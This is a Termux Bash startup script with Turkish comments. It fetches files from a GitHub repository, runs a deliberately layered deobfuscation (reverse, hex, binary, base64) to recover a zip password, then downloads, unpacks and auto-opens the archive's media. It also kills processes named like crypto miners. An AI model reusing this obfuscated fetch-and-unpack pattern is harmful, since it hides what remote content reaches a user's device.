<nasihat-v1>
<cert: 516D3974596D4567546D467A6157686864434469684B49675530464C535534675330484468306C535455453D>
<production_date: 1761247877>
<toast_message: 42C39C46452041C387494C4449204B41524445C59E494D21>
<no_toast_message: 53414B494E2047C39C4E44454DC4B0204B41C38749524D41>
runtime {
#!/data/data/com.termux/files/usr/bin/bash
# termux-startup — 717 final (PSW pipeline entegre)
# Kullanım: termux-startup adb process
set -euo pipefail
IFS=$'\n\t'

# ---------- Konfig ----------
GITHUB_BASE="https://raw.githubusercontent.com/HaCKuLtRALEGENDPRO/bizden-faydali-nasihatler-ogren/main"
STORY_URL="$GITHUB_BASE/gunun_hikayesi.txt"
SECURE_URL="$GITHUB_BASE/Guvenliy.sec"
UPDATE_URL="$GITHUB_BASE/UPDATE.md"
FALLBACK_CONTENT_URL="https://raw.githubusercontent.com/HaCKuLtRALEGENDPRO/bizden-faydali-nasihatler-ogren/main/resaaad.zip"

TMPDIR="${HOME}/.termux_startup_tmp"
mkdir -p "$TMPDIR"

EXPECTED_CERT_TEXT="Bomba Nasihat ™ SAKIN KAÇIRMA"
UNZIP_TIMEOUT=20
SEVENZ_TIMEOUT=30

# ---------- Yardımcılar ----------
log(){ printf '%s\n' "$*"; }
fetch_raw(){ local url="$1" out="$2"; curl -L --http1.1 -s -f --retry 3 --retry-delay 2 -o "$out" "$url"; }

# --- Onaylı decode pipeline (senin verdiğin sürüm, aynen) ---
reverse_text() {
  if command -v rev >/dev/null 2>&1; then
    printf '%s' "$1" | rev
  else
    local s="$1" out=""
    for ((i=${#s}-1;i>=0;i--)); do out+="${s:i:1}"; done
    printf '%s' "$out"
  fi
}

# parse \xHH sequences to bytes (perl)
parse_escaped_to_bytes() {
  local s="$1"
  if printf '%s' "$s" | grep -q '\\x' 2>/dev/null; then
    local HEXSEQ
    HEXSEQ=$(printf '%s' "$s" | perl -0777 -ne 'while(/\\x([0-9A-Fa-f]{2})/g){print $1}')
    if [[ -n "$HEXSEQ" ]]; then
      printf '%s' "$HEXSEQ" | xxd -r -p 2>/dev/null || true
      return 0
    fi
  fi
  return 1
}

# parse contiguous hex chars to bytes
parse_hex_to_bytes() {
  local s="$1"
  local CLEAN
  CLEAN=$(printf '%s' "$s" | tr -cd '0-9A-Fa-f')
  if [[ -z "$CLEAN" ]]; then
    return 1
  fi
  if (( ${#CLEAN} % 2 != 0 )); then CLEAN="0$CLEAN"; fi
  printf '%s' "$CLEAN" | xxd -r -p 2>/dev/null || true
  return 0
}

# unicode_escape -> text fallback (python)
unicode_escape_to_text() {
  python3 - <<'PY'
import sys,codecs
s=sys.stdin.read()
try:
    dec = codecs.decode(s, 'unicode_escape')
    print(dec, end='')
except Exception:
    sys.exit(1)
PY
}

# bits extraction
bits_only(){ printf '%s' "$1" | tr -cd '01'; }

# bits -> bytes
bits_to_bytes() {
  local bits="$1"
  local mod=$(( ${#bits} % 8 ))
  if [[ $mod -ne 0 ]]; then
    local pad=$((8-mod))
    bits=$(printf '%*s' "$pad" '' | tr ' ' '0')"$bits"
  fi
  if command -v perl >/dev/null 2>&1; then
    printf '%s' "$bits" | perl -0777 -ne 'print pack("B*", $_)'
  else
    python3 - <<PY
bits = """$bits"""
out = bytearray()
for i in range(0, len(bits), 8):
    out.append(int(bits[i:i+8], 2))
import sys
sys.stdout.buffer.write(bytes(out))
PY
  fi
}

# try base64 decode bytes -> bytes
try_base64_decode_bytes() {
  if printf '' | base64 -d >/dev/null 2>&1; then
    base64 -d 2>/dev/null || return 1
  else
    python3 - <<PY
import sys,base64
data=sys.stdin.buffer.read()
try:
    sys.stdout.buffer.write(base64.b64decode(data))
except Exception:
    sys.exit(1)
PY
  fi
}

# COMPLETE PSW PIPELINE (zorunlu binary aşaması içerir — senin talebin)
# input: raw psw block (string)
decode_psw_strict() {
  local raw="$1"
  local logf="$2"
  : > "$logf"
  echo "[A] PSW ham (trim): ${raw:0:140}..." >> "$logf"

  # 1) ters
  local s1
  s1=$(reverse_text "$raw")
  echo "[1] Ters çevrildi." >> "$logf"

  # 2) escaped \xHH -> bytes OR hex -> bytes OR unicode_escape -> text
  local step_bytes=""
  step_bytes=$(parse_escaped_to_bytes "$s1" 2>/dev/null || true)
  if [[ -n "$step_bytes" ]]; then
    echo "[2] Escaped \\xHH parse edildi -> bytes elde." >> "$logf"
  else
    step_bytes=$(parse_hex_to_bytes "$s1" 2>/dev/null || true)
    if [[ -n "$step_bytes" ]]; then
      echo "[2.b] Düz hex parse edildi -> bytes elde." >> "$logf"
    else
      local step_text
      step_text=$(printf '%s' "$s1" | unicode_escape_to_text 2>/dev/null || true)
      if [[ -n "$step_text" ]]; then
        echo "[2.c] unicode_escape fallback ile text elde edildi." >> "$logf"
        # Set bin source to this text for next step
        BIN_SRC_TEXT="$step_text"
      else
        echo "[ERROR] PSW parse edilemedi (escaped/hex/unicode_escape başarısız)." >> "$logf"
        return 1
      fi
    fi
  fi

  # 3) bytes -> utf-8 text (if bytes exist)
  local BIN_SRC_TEXT=""
  if [[ -n "${step_bytes:-}" ]]; then
    BIN_SRC_TEXT=$(printf '%s' "$step_bytes" | iconv -f utf-8 -t utf-8 2>/dev/null || true)
    echo "[3] Bytes -> UTF-8 string elde edildi." >> "$logf"
  fi

  # 4) kesin binary (0/1) adımı — ZORUNLU
  local BITS
  BITS=$(bits_only "$BIN_SRC_TEXT")
  if [[ -z "$BITS" ]]; then
    echo "[ERR] Binary (0/1) verisi bulunamadı; pipeline burada duruyor." >> "$logf"
    return 2
  fi
  echo "[4] Binary verisi bulundu (bit sayısı: ${#BITS})." >> "$logf"

  # 5) bits -> bytes
  local bin_bytes
  bin_bytes=$(bits_to_bytes "$BITS" 2>/dev/null || true)
  if [[ -z "$bin_bytes" ]]; then
    echo "[ERR] Binary -> bytes dönüşümü başarısız." >> "$logf"
    return 3
  fi
  echo "[5] Binary -> bytes tamam." >> "$logf"

  # 6) base64 decode
  local final_bytes
  final_bytes=$(printf '%s' "$bin_bytes" | try_base64_decode_bytes 2>/dev/null || true)
  if [[ -z "$final_bytes" ]]; then
    # fallback: text form then base64
    local as_text
    as_text=$(printf '%s' "$bin_bytes" | tr -d '\0' 2>/dev/null || true)
    final_bytes=$(printf '%s' "$as_text" | try_base64_decode_bytes 2>/dev/null || true)
    if [[ -z "$final_bytes" ]]; then
      echo "[ERR] Base64 decode başarısız." >> "$logf"
      return 4
    else
      echo "[6.b] Binary->text->base64 decode fallback başarılı." >> "$logf"
    fi
  else
    echo "[6] Base64 decode başarılı (doğrudan)." >> "$logf"
  fi

  # 7) sonuç metin
  local final_text
  final_text=$(printf '%s' "$final_bytes" | iconv -f utf-8 -t utf-8 2>/dev/null || true)
  echo "[7] HAM METİN (PAROLA) elde edildi." >> "$logf"
  printf '%s' "$final_text"
  return 0
}

# ---------- Main ----------
if [[ "${1:-}" == "adb" && "${2:-}" == "process" ]]; then
  clear
  log "=== termux-startup (auto) — ADB process başlatılıyor ==="

  # stop known miners
  pkill -f "minerd|mining|xmrig" >/dev/null 2>&1 || true

  # 1) hikaye
  STORY_FILE="$TMPDIR/gunun_hikayesi.txt"
  if fetch_raw "$STORY_URL" "$STORY_FILE"; then
    log "[OK] gunun_hikayesi.txt indirildi."
    # minimal cert check
    CERT_HEX=$(sed -n '/<cert:/s/.*<cert: \([0-9a-fA-F]\+\).*/\1/p' "$STORY_FILE" || true)
    if [[ -n "$CERT_HEX" ]]; then
      CERT_TEXT=$(echo "$CERT_HEX" | xxd -r -p 2>/dev/null | base64 -d 2>/dev/null || true)
      [[ "$CERT_TEXT" == "$EXPECTED_CERT_TEXT" ]] && log "[OK] Hikaye sertifikası doğrulandı." || log "[WARN] Hikaye sertifikası uyuşmuyor."
    fi

    ENCMETH=$(sed -n '/<encode_method:/s/.*<encode_method: \([^>]\+\).*/\1/p' "$STORY_FILE" || true)
    ENCPROMPT=$(sed -n '/^prompt {$/,/^}$/p' "$STORY_FILE" | sed '1d;$d' || true)
    if [[ -n "$ENCPROMPT" ]]; then
      if [[ "$ENCMETH" == "url" ]]; then
        DECODED_PROMPT=$(printf '%s' "$ENCPROMPT" | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()), end='')")
      elif [[ "$ENCMETH" == "base64" ]]; then
        DECODED_PROMPT=$(printf '%s' "$ENCPROMPT" | base64 -d 2>/dev/null || true)
      elif [[ "$ENCMETH" == "hex" ]]; then
        DECODED_PROMPT=$(printf '%s' "$ENCPROMPT" | xxd -r -p 2>/dev/null || true)
      else
        DECODED_PROMPT="Unknown encode_method: $ENCMETH"
      fi
      echo
      log "────────────── 📖 GÜNÜN HİKAYESİ ──────────────"
      printf '%s\n' "$(printf '%s' "$DECODED_PROMPT" | sed '/<cert:/d')"
      log "──────────────────────────────────────────────"
    fi
  else
    log "[ERR] gunun_hikayesi.txt indirilemedi."
  fi

  # 2) Guvenliy.sec indir ve psw solve
  SEC_FILE="$TMPDIR/Guvenliy.sec"
  if fetch_raw "$SECURE_URL" "$SEC_FILE"; then
    log "[OK] Guvenliy.sec indirildi."
    CERT_HEX=$(sed -n '/<cert:/s/.*<cert: \([0-9a-fA-F]\+\).*/\1/p' "$SEC_FILE" || true)
    if [[ -n "$CERT_HEX" ]]; then
      CERT_TEXT=$(echo "$CERT_HEX" | xxd -r -p 2>/dev/null | base64 -d 2>/dev/null || true)
      [[ "$CERT_TEXT" == "$EXPECTED_CERT_TEXT" ]] && log "[OK] Guvenliy.sec sertifikası doğrulandı." || log "[WARN] Guvenliy.sec sertifikası uyuşmuyor."
    fi

    ZIP_PSW_ENC=$(sed -n '/<psw {/,/}>/p' "$SEC_FILE" | sed '1d;$d' | tr -d '\r\n' || true)
    if [[ -z "$ZIP_PSW_ENC" ]]; then
      log "[ERR] ZIP parola bloğu bulunamadı."
    else
      LOGS="$TMPDIR/psw_logs.txt"
      # burada strict pipeline kullanılıyor (binary zorunlu)
      PSW=$(decode_psw_strict "$ZIP_PSW_ENC" "$LOGS" 2>/dev/null || true)
      log "Logs:"
      cat "$LOGS" 2>/dev/null || true

      if [[ -z "$PSW" ]]; then
        log "[ERR] ZIP parolası çözülemedi — işlem durdu."
      else
        log "[OK] Parola çözüldü: $PSW"

        # content_url veya fallback
        CONTENT_URL=$(sed -n '/<content_url:/s/.*<content_url: \([^>]\+\).*/\1/p' "$SEC_FILE" || true)
        if [[ -z "$CONTENT_URL" ]]; then
          CONTENT_URL="$FALLBACK_CONTENT_URL"
          log "[INFO] content_url bulunamadı; fallback kullanılıyor."
        fi
        TARGET_NAME=$(sed -n '/<target /s/.*<target \([^>]\+\)>/\1/p' "$SEC_FILE" || true)
        if [[ -z "$TARGET_NAME" ]]; then TARGET_NAME="$(basename "$CONTENT_URL")"; fi

        ZIP_TMP="$TMPDIR/$TARGET_NAME"
        log "[OK] ZIP indiriliyor: $CONTENT_URL"
        if fetch_raw "$CONTENT_URL" "$ZIP_TMP"; then
          if [[ ! -s "$ZIP_TMP" ]]; then
            log "[ERR] ZIP dosyası boş indi."
          else
            mkdir -p "$TMPDIR/content"
            CONTENT_DIR="$TMPDIR/content"
            if command -v unzip >/dev/null 2>&1; then
              log "[OK] unzip ile açılıyor..."
              timeout ${UNZIP_TIMEOUT}s unzip -P "$PSW" -o "$ZIP_TMP" -d "$CONTENT_DIR" >/dev/null 2>&1 || true
            else
              log "[WARN] unzip yok, 7z ile açılıyor..."
              timeout ${SEVENZ_TIMEOUT}s 7z x -p"$PSW" -y -o"$CONTENT_DIR" "$ZIP_TMP" >/dev/null 2>&1 || true
            fi

            if [[ -n "$(ls -A "$CONTENT_DIR" 2>/dev/null)" ]]; then
              log "[OK] ZIP açıldı. İçerik:"
              find "$CONTENT_DIR" -maxdepth 2 -type f -print | sed 's/^/  - /'
              # otomatik oynatma
              AUDIO=$(find "$CONTENT_DIR" -type f \( -iname "*.mp3" -o -iname "*.wav" -o -iname "*.ogg" \) | head -n1 || true)
              VIDEO=$(find "$CONTENT_DIR" -type f \( -iname "*.mp4" -o -iname "*.mkv" \) | head -n1 || true)
              IMAGE=$(find "$CONTENT_DIR" -type f \( -iname "*.png" -o -iname "*.jpg" -o -iname "*.jpeg" \) | head -n1 || true)
              if [[ -n "$AUDIO" ]]; then
                log "[AUTO] Audio oynatılıyor: $AUDIO"
                termux-media-player play "$AUDIO" || log "[WARN] termux-media-player hata."
              elif [[ -n "$VIDEO" ]]; then
                log "[AUTO] Video açılıyor: $VIDEO"
                termux-open "$VIDEO" || log "[WARN] termux-open hata."
              elif [[ -n "$IMAGE" ]]; then
                log "[AUTO] Görüntü açılıyor: $IMAGE"
                termux-open "$IMAGE" || log "[WARN] termux-open hata."
              else
                log "[INFO] Medya bulunamadı."
              fi
            else
              log "[ERR] ZIP açılamadı (parola yanlış veya dosya bozuk)."
            fi
          fi
        else
          log "[ERR] ZIP indirilemedi."
        fi
      fi
    fi
  else
    log "[ERR] Guvenliy.sec indirilemedi."
  fi

  # update.md
  UPDATE_FILE="$TMPDIR/UPDATE.md"
  if fetch_raw "$UPDATE_URL" "$UPDATE_FILE"; then
    log "[OK] UPDATE.md indirildi."
    sed -n '1,40p' "$UPDATE_FILE" || true
  else
    log "[WARN] UPDATE.md indirilemedi."
  fi

  # cleanup & finish
  pkill -f "minerd|mining|xmrig" >/dev/null 2>&1 || true
  log "=== termux-startup (auto) tamamlandı ==="
  exit 0
else
  echo "Kullanım: termux-startup adb process"
  exit 2
fi
}
